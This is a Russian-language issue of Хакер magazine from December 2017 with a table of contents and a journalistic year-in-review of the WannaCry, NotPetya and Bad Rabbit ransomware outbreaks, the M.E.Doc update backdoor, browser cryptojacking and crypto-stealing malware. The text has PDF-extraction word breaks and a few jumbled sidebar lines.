
                                                  Декабрь 2017
            № 226
CONTENTS

   MEGANEWS
  Итоги 2017 года

    64 подарка для хакера
  Выбира ем лучшие гиковские гад жеты для друзей и для себя

    Про качай десят ку!
  Настра иваем Windows 10 для безопасной и комфортной работы

    VPN не для всех
  Тун нелируем тра фик отдель ных приложений с помощью Linux network namespaces

   WWW
  Интересные веб‐сервисы

    Mr.Robot.S03
  Как новый сезон «Мис тера робота» радовал фанатов пасхалка ми и хакерскими играми

    Дайджест Android
  Уни версаль ные прошивки, современные кликботы, взлом приложений и маленький
  сетевой пен тест

    Как Apple обходит стан дарты, заставляя тебя платить
  Колон ка Олега Афонина

    Пять стол пов Android
  Технологии, лежащие в осно ве самой популяр ной ОС

    Серебряные пули
  Вскрываем уязвимость в vBulletin 5

    SMS‐бомбер на Python
  Эксплуатируем недоработ ки Vodafone

    Наивные прес тупники
  Как обыватели пря чут циф ровые улики

   Мобиль ная паранойя
  10 новых фактов о том, как носимые устройства следят за тобой

    Плохая логика
  Выполняем произволь ный код в популяр ном сервере приложе ний Oracle WebLogic

    «Я хотел ее только настроить...»
  Как я искал уязвимости в IP‐камерах и нашел их

    Вопрос вре доно са
  Разбира ем метод общения малвари с C&C через анонимные сервисы

    Нативно или нет?
  100 мифов о кросс‐плат формен ной разработке

    Python’ом по машинлернингу
  Разгребаем тон ны входящей корреспон денции без участия человека

    ASP.NET под защитой
  Как не допустить XSS, CSRF, SQLi, MIME snifﬁng и многого другого

    Юзай новый блю тус, BLE‐пять!
  Вдвое быстрее, вчетверо дальнобой нее

   Железкой по сети
  Пробрасываем USB‐устройства, видеокарту, звуковуху и диски на удаленную машину

    Десят ка быстрых
  Выбира ем гик‐софт для повседневных нужд

     Тит ры
  Кто дела ет этот журнал


ХАКЕР: ГОДОВОЙ ОТЧЕТ 2017.
 ТРЕНДЫ, СОБЫТИЯ, ЛЮДИ





                           Мария «Mifrill» Нефёдова
                                         nefedova@glc.ru

Ухо дящий год оказался богат на гром кие взломы и мас совые
сливы данных, вирусные эпи демии ранее невидан ных мас‐
шта бов,    а    некото рые    тренды,   обоз начившиеся
еще в 2016 году, про должают набирать обороты. К примеру,
интернет  вещей  по‐преж нему  вопиюще  небезопасен,
а  интерес  к  крип товалютам быстро  растет  не  толь ко
у инвесто ров и новаторов, но и у кибер преступни ков.





МАССОВЫЕ ЭПИДЕМИИ
ШИФРОВАЛЬЩИКОВ


В прош логод нем итоговом отчете мы уже называ ли вымогательское ПО нас‐
тоящей чумой, и в 2017 году ситуация изменилась только к худшему. Вымога‐
телей, шиф ровальщиков и вайперов не ста ло мень ше, напротив, авторы таких
вре доно сов берут на воору жение все новые тех ники атак и рас пространения,
а также адап тиру ют для своей малвари инс тру менты спецслужб.
   Хуже того, на черном рынке появляется все больше сервисов, предлага‐
ющих взять вымогателя в арен ду за весь ма скромную плату. Это допол‐
нительно снижает порог входа в этот «биз нес» для преступников (даже
для тех, кто не имеет глу боких тех нических знаний).
  Но конеч но, в пер вую очередь 2017 год запомнится всему миру из‐за
серии мас совых вымогательских атак.





WannaCry
WannaCry (также известный под названиями Wana Decrypt0r, WCry, Wanna‐
Crypt0r и WannaCrypt), был обнаружен отнюдь не в середи не мая 2017 года,
когда началась эпи демия, взбудоражившая весь мир. Впервые вирус был
замечен спе циалистами в феврале 2017 года, но не произвел на них боль‐
шого впечатления, так как был совершенно заурядным вымогателем, каких
в настоящее время нас читываются десят ки, если не сотни.





По чему началась эпи демия, если WannaCry — это рядовой вымогатель? Дело
в том, что в середине мая 2017 года раз работчики WannaCry выпустили вто‐
рую версию вре доно са, пос ле чего тот стал рас пространяться со скоростью
лесного пожара и посе ял в Сети нас тоящую панику.
   Та кой эффективности авторам WannaCry удалось добиться благодаря
тому, что они в бук вальном смысле взяли на воору жение экс плоиты из арсе‐
нала спецслужб. Дело в том, что еще летом 2016 года группа хакеров,
называющих себя The Shadow Brokers, сумела похитить хакерский инс тру мен‐
тарий у спе циалистов АНБ, а в апреле 2017 года груп пировка опуб ликовала
эти данные совершенно бесплатно, в открытом доступе.
   Го товы ми инструментами из хакерского арсенала АНБ (а именно экспло‐
итами EternalBlue и DoublePulsar) и воспользовались создатели WannaCry,
прев ратив заурядного с технической точки зре ния шифровальщика в SMB‐
червя, от которо го в ито ге пострадало около полумиллиона устройств и сотни
орга низаций по все му миру.





Са ми по себе инструменты EternalBlue и DoublePulsar никак не улучшали фун‐
кциональность шиф ровальщика, но они поз волили WannaCry распростра‐
нять ся через уязвимость в про токо ле SMB (Server Message Block).
  О том, что в SMB были обнаружены большие проблемы, ][ предупреждал
еще в январе и феврале 2017 года. Более того, в марте 2017 года, задолго
до того, как WannaCry начал экс плуатировать данные уязвимости, компания
Microsoft  выпустила  исправление, представив бюл летень  безопасности
MS17‐010, который пол ностью устранял проблему. ][ сообщал о выходе этих
важ ных патчей, а в апре ле текуще го года еще раз заострил внимание на том,
что Microsoft закрыла большинство брешей, которые эксплуатировало в своих
операци ях АНБ.
  Наряду с другими изда ниями и специалис тами мы неоднократ но предуп‐
реждали о том, что вскоре «киберарсенал» АНБ могут начать исполь зовать
хакеры. Однако зачастую ком пании и пользователи не спе шат уста нав ливать
обновле ния, применяют давно устаревшее ПО и мало тревожатся о собс‐
твен ной безопасности.
  Паника, которую породи ли атаки WannaCry, — это прямое следствие пов‐
семес тного халатного отношения к безопасности. Пользователи искренне
полага ют, что, не откры вая подозрительные письма и не перехо дя по подоз‐
рительным ссыл кам, они не могут заразиться вирусом. WannaCry напомнил
миру, что это не так. Бла годаря тому что шифровальщик исполь зует Eternal‐
Blue и DoublePulsar, дос таточ но просто вклю чить уяз вимый компьютер, под‐
ключенный к интернету. Жертве не при дет ся посещать вредоносные сайты,
откры вать подоз рительные почтовые вло жения и вообще что‐либо делать.
Заражение произойдет  авто матически, через  эксплуатацию  уязвимос ти
в SMB.
  С одной стороны, косвенно «поб лагода рить» за «вымогательский апо‐
калип сис», развернув шийся по все му миру, можно хакер скую группировку
The Shadow Brokers. Ведь именно эта груп па сделала достоянием общес‐
твен ности опасные киберинструменты АНБ. Одна ко с тем же успехом обви‐
нить в случив шемся можно и сами спецслужбы, которые соз дали экс плоиты
EternalBlue и DoublePulsar и долгое время умалчивали о критичес кой уяз‐
вимос ти в SMB. Именно так пос тупил главный юрисконсульт ком пании Mi‐
crosoft Брэд Смит (Brad Smith), и с его позицией пол ностью согласился даже
пре зидент РФ Владимир Путин.
   Также можно возложить ответс твенность на компанию Microsoft, которая
исправила уязвимос ти еще в марте 2017 года, успе ла подготовить патчи
для устаревших, непод держиваемых ОС в фев рале 2017‐го, но предпочла
не прив лекать к проб леме внимания, а так же «придер живала» патчи для Win‐
dows XP, Windows 8 и Windows Server 2003 до тех пор, пока катас трофа
не разразилась в полной мере.
  И конеч но, не сто ит забывать о самих разработчиках WannaCry. До сих пор
доподлинно неизвестно, кто это был. Как ут вер жда ют специалисты Symantec
и «Лаборатории Касперского», с большой долей вероятности шифроваль‐
щика разработали северо корей ские хакеры из небезыз вестной группировки
Lazarus, за которой эксперты наблюдают уже много лет. С этой точкой зрения
сог ласны власти США, Великоб ритании, Авс тралии и других стран. Спе‐
циалис ты компании Flashpoint, в свою оче редь, провели лингвистический
ана лиз WannaCry и обнаружи ли «китай ский след». Нашлись даже те, кто пред‐
положил, что основной целью неизвес тных авторов WannaCry были манипу‐
ляции с кур сами крип товалют.





Стоит сказать, что в мае 2017 года миру, который был совершенно не готов
к появлению WannaCry, еще повезло. Ведь настоящим «героем дня» тогда
стал ИБ‐специалист Маркус Хат чинс (Marcus Hutchins), известный под псев‐
донимом MalwareTech. Имен но он обнаружил в коде вредоноса аварий ный
«стоп‐кран»: оказалось, что перед началом работы малварь обращается
к домену iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com, проверяя, сущес твует
ли он. Если домен не зарегис трирован, мал варь начинает шифровать фай лы.
Однако если домен существует, вымога тель останавлива ет процесс зараже‐
ния.
   MalwareTech зарегистрировал указанный домен, активировав тем самым
механизм  «аварийного  отключения»,  после  чего  количество  успешных
зараже ний WannaCry рез ко сни зилось, а компании и пользовате ли получили
столь необходимый тайм‐аут, позволивший им экс тренно залатать бреши.
Если бы дан ный «рубиль ник» не был най ден, последствия от эпидемии Wan‐
naCry могли бы быть гораздо пла чевнее.





NotPetya
Не успел мир оправиться от атак WannaCry, как 27 июня 2017 года началась
новая вымогательская эпидемия. Ее причиной ста ло появление новой вари‐
ации шифровальщика Petya, ори гинальная версия которого была известна
спе циалистам с 2016 года. Операто ры этой малвари явно переняли нес коль‐
ко приемов у разработ чиков нашумевшего WannaCry и сумели спровоци‐
ровать в Сети оче ред ную волну паники.
  Оригинальный шифровальщик Petya был обнаружен в марте 2016 года.
Однако вер сия, с которой мир столкнул ся в июне, силь но отличалась от ста‐
рого «Пети». Из‐за этих отличий исследователи присвоили угрозе множество
новых имен, среди которых NotPetya, SortaPetya, Petna, Nyetya, ExPetr. Мы
остановимся на названии NotPetya.





                 Оригинальный Petya 2016 года

Спе циалисты компаний Payload Security, Avira, Emsisoft, Bitdefender, Symantec
и многие другие эксперты подтвердили, что для рас пространения NotPetya
использовались уязвимос ти про токо ла SMB и эксплоит, похожий на инстру‐
мент EternalBlue, похищен ный у АНБ. Также ана лити ки «Лаборатории Каспер‐
ского» сооб щили, что авторы вредоноса взяли на вооружение и еще один
инструмент, украденный у спецслужб, — экс плоит EternalRomance.
   NotPetya не просто шифровал файлы пользователей, но шиф ровал MFT
(Master File Table) для раз делов NTFS, переза писы вал MBR (Master Boot
Record) и имел кастомный загрузчик, который отображал вымогательское
пос лание вместо заг рузки операци онной системы.
   Хуже  того,  спустя несколько дней пос ле  начала  атак специалисты
«Лаборатории Каспер ско го» и иссле дова тель Comae  Technologies Мэтт
Сюиш (Matt Suiche) пришли к выводу, что NotPetya вообще некорректно
называть шифровальщиком. Дело в том, что вредонос, по сути, был создан
для унич тожения информации, — восста новить постра давшие данные ока‐
залось поч ти невоз можно, и это не ошиб ка, а замысел авторов малвари.
Поэтому NotPetya точнее будет называть вайпером (от англий ского wiper —
«чис тильщик»).
   Сто ит отме тить, что с этой теорией сог ласны не все. К при меру, иссле‐
дователи F‐Secure допускают, что NotPetya мог быть имен но шифроваль‐
щиком, прос то его создатели совершили ряд ошибок во вре мя разработ ки.
   Как бы то ни было, вскоре стало ясно, что у жертв NotPetya практически
нет надежды на восста новление пос тра дав шей информа ции. Платить выкуп
злоумышленникам оказалось бесполезно. Даже если жертвы не поверили
выводам экспертов, признавших NotPetya вай пером, у них все равно не было
шан сов. Дело в том, что после оплаты выкупа сле довало отправить злоумыш‐
ленникам письмо на адрес wowsmith123456@posteo.net, чтобы получить инс‐
трукции по рас шифровке данных. Однако уже вечером 27 июня 2017 года
этот адрес был заблокирован администра цией сер виса Posteo. Писать стало
попросту некуда и некому.
   Спустя полторы недели после начала атак NotPetya ИБ‐экспер ты зафик‐
сировали сразу два события. Во‐первых, средс тва на Bitcoin‐кошельке мал‐
вари пришли в дви жение. Сначала зло умышленники переве ли 285 и 300 дол‐
ларов на кошельки сер висов Pastebin и DeepPaste, а часом позже осуществи‐
ли  транзакцию,  прив лекшую  всеобщее  внимание:  вывели  с  кошель‐
ка 3,96298755 биткойна (поряд ка 10 тысяч долларов на тот момент), то есть
весь свой суммарный «заработок».
   Во‐вторых, одновремен но с этим на Pastebin и DeepPaste были опуб‐
ликова ны офи циальные сооб щения преступни ков. Оба послания гласили:
«Пришлите мне 100 биткой нов и получи те мой сек ретный ключ для рас‐
шифровки любого жесткого диска (кроме загрузочных)». При этом хакеры
не сопроводили свое сообщение адре сом кошелька, вместо этого для связи
с ними предлагалось использовать даркнет‐сервис Mattermost — онлайн‐чат,
похожий на Slack.
  В чате хакеры действи тельно присутс твовали и даже пояснили жур налис‐
там изданий Vice Motherboard и Bleeping Computer, что высокая стоимость
ключа обус ловлена тем, что это «ключ для расшифров ки всех компь ютеров».
То есть зло умышленники выс тавили на про дажу секретный ключ для user‐
mode крип тографического модуля. Также они с готовностью представили
доказательства сво их слов. Предста вители Motherboard, при поддержке спе‐
циалис тов компании ESET, выс лали хакерам зашифрованный NotPetya файл,
который неизвестная груп па успешно рас шифровала. Пос ле этого хакеры
замолчали, сооб щив, что теперь принимают только «реальные предложения».
По их сло вам, покуп кой ключа за четверть мил лиона долларов заинтересо‐
вались сразу несколько человек.
   Хо тя неясно, кто сто ял за разработ кой NotPetya и зачем пов реждающую
данные малварь отправили «в большое плавание», экспертам удалось уста‐
новить, как именно распространялся вирус и почему от NotPetya пос традали
в основном ком пании и организации, но не час тные лица.
   Практически сразу после начала эпи демии мно гие специалисты свя зали
рас пространение NotPetya с бухгалтерским програм мным обес печени ем
M.E.Doc. К примеру, такие предположе ния выс казали сотрудники украинской
киберполиции, а также аналитики Cisco Talos, Microsoft и «Лаборатории Кас‐
перско го».
   Больше недели официальная страница M.E.Doc в Facebook пополнялась
раз личны ми опровержени ями этих обви нений. Разработчики до пос леднего
утверждали, что M.E.Doc не имеет никакого отношения к вымога тельской
эпи демии, и сообщали, что к рас следованию слу чившегося были прив лечены
правоохранительные орга ны и спе циалис ты Cisco. Но потом экспер ты ком‐
пании ESET предста вили собствен ный ана литический отчет, в котором сог‐
ласились с выводами коллег и рассказали, что им уда лось обнаружить бэк‐
дор, исполь зовавшийся для рас пространения NotPetya и шиф роваль щика
XData.
   Бэкдор был  най ден  в одном  из  легитимных модулей  M.E.Doc,  и,
как говорилось в отче те, «маловероятно, что ата кующие выполнили эту опе‐
рацию без дос тупа к исходному коду прог раммы». Более того, изучив все
обновле ния M.E.Doc, выпущенные в текущем году, спе циалис ты выяснили,
что модуль бэк дора содержали как минимум три апдейта (от 14 апреля,
15 мая и 22 июня 2017 года).



            «„Нулевым пациентом“ ста ли укра инские поль-
             зовате ли  M.E.Doc,  кор поратив ного  програм-
           много обес печения для отчетнос ти и докумен-
            тооборота. Ата кующие получили дос туп к сер-
             веру обновле ний M.E.Doc и с его помощью
            нап равляли   троянизированные   обновле ния
             с автоматичес кой уста нов кой», — рас ска зали
            спе циалис ты ESET.



Об наруженный  бэк дор  поз волял  опе рато рам  загружать  и  выполнять
в заражен ной системе другое вредонос ное ПО, как это произошло с NotPetya
и XData. Кроме того, малварь собирала нас тройки прокси‐серверов и email,
включая логины и пароли из приложе ния M.E.Doc, а так же коды ком паний
по ЕДРПОУ (Единому государственному реестру предприятий и организаций
Украины), что позволяло идентифицировать жертв. По совокупности приз‐
наков, включающих инфраструктуру, вре доносные инстру менты, схе мы и цели
атак, исследователи ESET пред положи ли, что за эпидеми ей NotPetya стояла
хакерская группа, известная под названи ем TeleBots.
  В итоге признать ся в том, что обновления M.E.Doc действитель но рас‐
пространяли малварь, разработчиков бухгалтерского ПО вынудило лишь изъ‐
ятие сер веров компании и заявление гла вы украинской кибер полиции Сергея
Демидюка, который сооб щил, что из‐за про явленной халатности разработ‐
чикам может грозить уголовная ответс твенность.
  Уже пос ле это го спе циалисты компании Cisco, на мес те изучавшие арес‐
тованные сер веры M.E.Doc, представили отчет, сог ласно которому разработ‐
чики новой версии Petya проникли в сеть «Интеллект‐Сер вис» еще вес‐
ной 2017 года, используя для этого учет ные данные одного из сотрудников
ком пании.





Bad Rabbit
Еще  одна  вымогатель ская  эпидемия  разразилась осенью 2017  года.
24 октября круп ные российские СМИ, а так же ряд украинских госучреждений
под верглись ата кам неизвестных злоумыш ленников. В числе постра давших
оказались «Интерфакс», «Фонтанка» и как минимум еще одно неназ ванное
интернет‐издание. Вслед за СМИ о проб лемах также сооб щили Международ‐
ный аэропорт «Одесса», Киев ский мет рополитен и украинское Минис терство
инфраструк туры.
  По данным аналити ков Group‐IB, преступни ки также пытались ата ковать
банковские инфраструк туры, но эти попыт ки оказались неудачными. Спе‐
циалис ты ESET, в свою очередь, сооб щили, что атаки также коснулись поль‐
зователей из Болгарии, Турции и Японии.
  Перебои в работе компаний и госучрежде ний были вызваны шифроваль‐
щиком, который получил имя Bad Rabbit. Мал варь сообщала жертвам, что все
их данные зашифрованы, и требовала 0,05 бит койна выкупа.





Из начально вре донос рас простра нялся под видом фальшивых обновлений
и установщиков Adobe Flash. Фактичес ки жертвы дол жны были вруч ную заг‐
рузить и запустить малварь, тем самым заразив свои компьюте ры. При этом
фальшив ки были под писаны поддельными сертифика тами, имитирующими
сертификаты Symantec. Как вскоре выяснили спе циалис ты, Bad Rabbit рас‐
пространялся сра зу несколькими взломанными сайтами, в основном отно‐
сящимися к катего рии СМИ.





Пос ле эпидемий шиф ровальщиков WannaCry и NotPetya за анализ новой
угро зы тут же взялись ведущие ИБ‐компании мира. Уже на следующий день
пос ле первых атак «Плохого кролика» мал варь изу чили специалисты Bitde‐
fender, Cisco Talos, ESET, Group‐IB, Intezer Labs, «Лабора тории Касперского»
и Malwarebytes.
  Все исследователи были согласны в одном: Bad Rabbit и вай пер NotPetya,
скорее все го, имеют общие корни, так как угрозы весьма похожи, хотя боль‐
шая часть кода Bad Rabbit и была переписана. Это означало, что вредоносы
могли быть соз даны одной хакерской группой.
   Если теории спе циалистов верны, то за соз данием Bad Rabbit и NotPetya,
по всей видимос ти, сто ит группировка TeleBots (она же известна как BlackEn‐
ergy и Sandworm Team), которую ранее уже связывали с эпидеми ей NotPetya.
Эти же злоумыш ленни ки были ответс твен ны за раз работку малвари XData
и KillDisk, а также сто яли за атаками на энергосистему Украины.
   Аналити ки компании Intezer подсчитали, что исходный код вре доно сов
сов падает лишь на 13%. В то же время специалисты Group‐IB сооб щили:



            «Bad Rabbit является модифицированной вер-
            сией  NotPetya  с  исправ ленны ми ошибками
             в алгоритме шиф рования. В ата ке NotPetya
            содер жался  такой же  алгоритм  вычис ления
            хеш‑сум мы от име ни процес са, с тем отли-
             чием,  что  начальный  век тор инициализации
             в  слу чае  NotPetya  0x12345678,  а  в  Bad
              Rabbit — 0x87654321.

               Так же в текущей ата ке поменялось количес-
             тво искомых имен процес сов, а сама функция
            вычис ления хеша была ском пилирована в виде
             отдельной функции ком пилятором.

             Сов падения в коде ука зыва ют на связь ата ки
             с использованием Bad Rabbit с пре дыду щей
             ата кой NotPetya или их под ражате лями».



Вначале эксперты еди нодуш но решили, что на скорость распространения
Bad Rabbit повлияло использование утилиты Mimikatz, списка распространен‐
ных логинов и паролей, SMB и WebDAV, но при этом злоумышленники обош‐
лись без украденных у АНБ экспло итов. В час тности, специалис ты писали, что
хакеры не использовали инстру мент EternalBlue, эксплуатирующий бреши
в SMB. Напом ню,  что вирусы WannaCry и  NotPetya рас пространялись
при помощи именно этого инс трумента.
  Но вскоре стало ясно, что эксперты поторопились с выводами и без
похищенных у АНБ эксплоитов дело все‐таки не обошлось. Исследователи
Cisco Talos и F‐Secure выяснили, что авто ры Bad Rabbit исполь зовали не Eter‐
nalBlue, а похожий эксплоит EternalRomance, тоже экс плуатирующий бре ши
в SMB. Этот факт был обнаружен не сразу, так как ата кующие зна чительно
модифи цировали инструмент и авто матичес кое сканирование его не рас‐
познало.
   Также иссле дова тели Cisco Talos отметили, что данная версия EternalRo‐
mance очень похожа на Python‐имплемен тацию экс плоита, использован ного
для рас пространения NotPetya. При этом новый вари ант оставался по‐преж‐
нему близок к ори гинальному EternalRomance, который опубликовали чле ны
хакерской группы The Shadow Brokers, исходно похитившей кибероружие
у АНБ.
   Когда основные технические подробности о Bad Rabbit были раскрыты,
спе циалисты при нялись строить теории, пытаясь понять, какую цель прес‐
ледовали авто ры малвари. В отли чие от NotPetya новая угроза не была вай‐
пером, то есть не унич тожала информа цию на жес тких дис ках своих жертв.
По сути, Bad Rabbit был именно тем, чем казался, — шиф ровальщиком.
Но крайне скромная сумма выкупа, выбор целей для атак, а также прошлые
«заслуги» груп пировки TeleBots зас тавили спе циалис тов пред положить, что
«Пло хой кролик» мог слу жить прикрытием для некой более серьезной атаки.
То есть шиф ровальщик мог попросту отвлекать внимание и заметать сле ды
на заражен ных машинах. Впрочем, данная теория до сих пор не нашла
никаких подтверждений.





         сле дователи сочли вымогатель Spora очень сложным и обнаружи‐ →Ис
        ли, что авто ры вируса предлагают заранее приобрести иммунитет
       от заражения

              атаки шифровальщика  техас ская полиция лишилась  улик →Из‐за
       за последние восемь лет

          па  ИБ‐специалис тов  соз дала  proof‐of‐concept  вымогателя →Груп
       для систем SCADA и АСУ

          циалис ты ком паний Fortinet и AlienVault изучили образчики новых →Спе
       вредоносов для Mac, которые рас пространяются в даркнете «по под‐
       писке», то есть с использовани ем популярной на черном рынке схе мы
      «малварь как услуга» (malware‐as‐a‐service)

          пания Symantec обна ружила, что на андегра ундных хакерских →Ком
       ресурсах в Китае начали активно рек ламиро вать приложе ние для An‐
         droid, которое позволит любому желающему соз дать собственного
      вымогателя за несколько минут
КРИПТОВАЛЮТНАЯ
ЛИХОРАДКА


Курсы крип товалют в этом году демонс трируют рекордный рост, а СМИ прак‐
тически каждый день сооб щают о новых рекордах Bitcoin и рас сказывают
об огромном потенциале блок чейна. Минувшим летом из‐за всеобщей
«золотой лихорадки» виде окарты AMD (RX 470/480, RX580), а также почти вся
серия 10хх Nvidia исчезли из магазинов, а оставшиеся в продаже карты
выросли в цене в полтора‐два раза и до сих пор не вернулись к нор ме. Поб‐
лагодарить за это, в числе прочего, сле довало май неров.
  Совсем неуди витель но, что злоумыш ленники все чаще предпочитают
не май нить крип товалюту самос тоятель но, а красть ее у других поль зовате‐
лей или использовать для этих целей мощности чужих компьюте ров, сер‐
веров, смартфонов и любых дру гих устройств.





Криптодже кинг
Настоящая эпидемия крип тоджекин га (cryptojacking) захлес тнула интернет
осенью 2017 года, и это явление продол жает закономерно развиваться и по
сей день. Суть крип тоджекин га предель но проста: в код сай тов внедряют
спе циальные скрипты, которые конверти руют мощности CPU посетителей
ресурса в крип товалю ту. Фак тичес ки это прос той май нинг через браузеры.
  Основной толчок этому мас совому явлению дали опе раторы торрент‐тре‐
кера The Pirate Bay, которые в сентябре 2017 года провели испы тания и вре‐
менно встро или криптовалют ный майнер в нес колько страниц сай та. Тогда
операто ры тре кера пояснили, что майнер может стать новым средством
монети зации и поможет ресурсу в будущем пол ностью избавиться от тра‐
дици онной рекламы. В октябре май нинговый скрипт для добычи криптовалю‐
ты Monero, пре доставленный сервисом Coinhive, вновь вернулся на страницы
трекера, и, похоже, на этот раз май нер «при шел, чтобы остаться».





               До и после визита на The Pirate Bay

Са ми по себе май нин говые сервисы нельзя назвать незаконными. Однако
крип тодже кинг становится все популярнее именно среди зло умышленни ков,
а майнинговые скрипты далеко не всег да используются законным путем.
К примеру, скрипты Coinhive уже приспособи ли для добавления скрытого
майнера во взло манное рас ширение для Chrome, а также скры тые майнеры
были обнаруже ны на многих ресур сах из топа Alexa (AirAsia, TuneProtect, офи‐
циальный сайт Криштиану Роналду и дру гие). Хуже того, использовать скрип‐
ты проекта Coinhive начали некоторые Tor2Web прокси, скры тый майнер был
най ден и в мод динго вой платформе для Grand Theft Auto V, FiveM.
  Основная проблема заключа ется в том, что боль шинс тво ресурсов, встро‐
ивших май неры в свои стра ницы, вооб ще не предуп реждают поль зователей
о про исходящем, а скрипты Coinhive и других аналогичных сервисов зна‐
чительно нагружают CPU и оття гивают на себя поч ти все ресурсы систем
посетителей. Кро ме того, зло умышленники и опе раторы сайтов, желающие
под заработать, не предос тавляют поль зователям возможность отклю чения
майнеров. Из‐за этого многие ИБ‐спе циалис ты и ком пании рассматрива ют
такие скрипты как малварь. К примеру, ком пания Cloudﬂare уже перешла
к активным действи ям и начала бло киро вать подобные ресурсы.
  Впрочем, легитимное применение майнин гу через браузеры тоже наш‐
лось. К примеру, май нер Coinhive встро или в браузерное расширение Iridium,
однако его разработчики уведоми ли об этом поль зовате лей, предоставив им
воз можность отклю чить май нер при желании.
  Похожим образом поступили и операто ры закрытого тор рент‐трекера
PublicHD. Поль зователям ресур са пред ложили не прос то майнить Monero
на благо администраторов, но и под нимать таким образом свой рейтинг
на тре кере, то есть работа майнера зачтется бонусом к отданному и под‐
нимет upload credit.
   Если в конце сентября 2017 года сер висов для браузерного май нинга
нас читывалось совсем немного и большинство сайтов предпочитали услуги
Coinhive, то уже спустя месяц ситуация кар диналь но поменя лась. Первым
конкурен том Coinhive стал ана логич ный сер вис Crypto‐Loot, который тоже
предложил опе раторам сайтов встро ить в код страниц JavaScript и «копать»
Monero, исполь зуя компьютеры пользователей.
   Вскоре, помимо Coinhive и Crypto‐Loot, в Сети уже можно было обна‐
ружить и другие подобные решения, к при меру MineMyTraﬃc и JSEcoin. Также
ИБ‐спе циалист Трой Марш (Troy Mursch) нашел два китай ских клона Coinhive
(Coin Have и PPoi), а эксперты Microsoft заметили сервисы CoinBlind и Coin‐
Nebula. Два последних про екта даже не имеют собс твенных сайтов и, судя
по  все му,  ори ентированы  исклю читель но  на  хакерский  андеграунд
и нелегальное исполь зование.
  Пока пальму первенства уверенно удер жива ет Coinhive, и ИБ‐спе циалисты
даже запустили спе циальный сайт WhoRunsCoinhive, на котором можно про‐
верить, какие ресурсы используют такие скрип ты. Однако стоит помнить
о том, что проблемны ми теперь могут ока заться не толь ко сайты.
  Скры тые майнеры уже были адап тирова ны к формату плагинов для Word‐
Press. Нап ример, в официальном репозитории можно было обнаружить
как минимум два таких решения: Simple Monero Miner — Coin Hive и Coin Hive
Ultimate Plugin. Вско ре после их появления позицию по данному вопросу были
вынуждены  озвучить администраторы офи циаль ного репозитория Word‐
Press.org. Они высказались против майнеров и заявили, что один плагин уже
был блокирован имен но из‐за наличия майнера в коде.
  Тем временем специалисты Trend Micro и вовсе сообщили, что им удалось
обнаружить майнин говые скрип ты в составе трех приложений для Android.
При чем при ложе ния Recitiamo Santo Rosario Free и SafetyNet Wireless App
были свобод но дос тупны в офи циальном каталоге Google Play. Все провер ки
безопасности Google не сумели выявить, что программы запускают майнер
в фоновом режиме, с помощью WebView. Третье приложе ние и вов се обхо‐
дилось без это го, но использовало библиотеку CpuMiner, то есть майнило
даже без откры тия браузера.
  Иссле дователи Trend Micro с тревогой отмечают, что приложениям не нуж‐
но запрашивать никаких дополнитель ных разрешений для такой активности,
а сама работа май нера может провоцировать перегрев мобильного устрой‐
ства, значительно сок ращать «срок жизни» батареи и, разумеется, сказывать‐
ся на произво дитель нос ти девайса.
   Сто ит  заметить,  что в настоящее время об браузерного майнинга
защища ют практически все антивирусные про дукты и блокировщики рекламы,
запрещающие работу скрип тов. Также в Chrome Web Store можно найти спе‐
циальные «про тивомайнин говые» расширения, и пользователь всегда может
самос тоятельно отклю чить JavaScript или установить соответс твенные допол‐
нения для браузе ра (к примеру, NoScript и ScriptBlock).
   Сталкиваясь со всевоз можными бло кировками, преступники и владельцы
сайтов лишь стали при бегать к различным ухищ рени ям. К примеру, в ноябре
и декаб ре 2017 года ИБ‐эксперты обна ружили, что майнеры научились мас‐
кировать свою деятельность и теперь скры ваются за диспетче ром тегов
Google, интегри руются в популярные виджеты «живых чатов» (онлайн‐кон‐
сультантов) и даже обнаружи ваются в сос таве скрип тов, которые в соответс‐
твии с законами ЕС приз ваны информировать посети телей сайтов о том, что
ресурс исполь зует cookie.
  К сожале нию, на этом «гонка вооружений» опре деленно не заканчивается.
Пока спе циалисты по информа ционной безопас ности будут предлагать все
новые способы блокировки браузерных майнеров, владель цы подобных сер‐
висов и злоумыш ленни ки продолжат придумывать новые способы обхода
этих зап ретов, ведь криптовалю та по‐прежнему про должает дорожать.





Скры тые майнеры и воры повсюду
Компрометация пользовательских браузе ров и крип тоджекинг — это лишь
одна сто рона медали. Еще в прош лом году экспер ты фиксировали уве ренный
рост всевоз можной малвари для майнин га, и в 2017 году эта тенденция
не прос то сох ранилась, но продолжила развивать ся.
  Функции добычи криптовалю ты или похище ния учет ных данных крип‐
товалют ных кошельков можно обнаружить едва ли не в каждой второй угрозе.
Сог ласно данным «Лабора тории Каспер ско го», если в 2013 году было най‐
дено все го 205  тысяч  атак  таких вредоносов,  то  за пер вые восемь
месяцев 2017 года их количество превысило 1,65 миллиона.


Угрозы для домаш них пользовате лей
Осенью 2017 года специалисты ком пании Trend Micro об наружили новую вер‐
сию известного шифровальщика Cerber, которая не только шиф рует файлы
жертв и вымогает у пос тра давших выкуп, но и похища ет криптовалю ту
и пароли от чужих кошельков.
   Те перь известный вымогатель не сра зу приступа ет к шиф рованию фай лов
на заражен ной машине. Вначале малварь ищет признаки криптовалют ных
кошельков Bitcoin Core, Electrum и Multibit и, если находит, похищает связан‐
ные с приложениями файлы wallet.dat (Bitcoin), *.wallet (Multibit) и electrum.dat
(Electrum). Конечно, эти фай лы сами по себе не позволят прес тупни кам
похитить чужую крип товалю ту, еще им понадо бится пароль для доступа
к кошельку. Но аналитики Trend Micro отмечают, что авторы мал вари, очевид‐
но, ищут новые спо собы монетизации сво его «про дукта», и совсем неуди‐
вительно, что они при этом обратили внимание на криптовалюту.
  Все те же ана литики Trend Micro предупредили и о появлении майнин‐
гового трояна CoinMiner. По данным спе циалис тов, распространение мал‐
вари трудно остановить или замедлить, так как вредонос использует украден‐
ный у АНБ экспло ит EternalBlue, который так же при меня ли WannaCry и Not‐
Petya,  и  инструментарий  WMI  (Windows  Management  Instrumentation),
как некогда делал нашумевший вредонос Stuxnet. Более того, бла годаря
использованию скрип тов WMI вредонос не оставля ет почти никаких следов
в системе и работает в памяти устройства.
  Еще одна старая и извес тная угроза, обза ведшаяся новой функциональ‐
ностью, — это банкер TrickBot. Аналитики компании Forcepoint сообщили, что
новей шие образцы TrickBot обла дают интересной особенностью. В файле
конфигурации малвари появился раздел, отвечающий за фишинговый овер‐
лей для страницы входа на сайт Coinbase.com. Удивляться не приходится,
ведь на сегод няшний день Coinbase — один из круп ней ших криптовалютных
веб‐кошельков в мире.
